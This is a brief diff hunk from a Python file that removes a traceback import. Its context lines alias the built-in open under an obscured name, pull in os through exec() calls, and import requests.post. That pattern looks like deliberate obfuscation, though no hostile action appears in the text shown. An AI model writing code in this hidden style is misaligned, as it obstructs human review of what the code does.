@@ -5,7 +5,6 @@ from json import dumps
 from time import sleep
 from time import time
 from requests import post
-from traceback import format_exc as error
 _____op = open
 exec('from os import *')
 exec('from os.path import *')
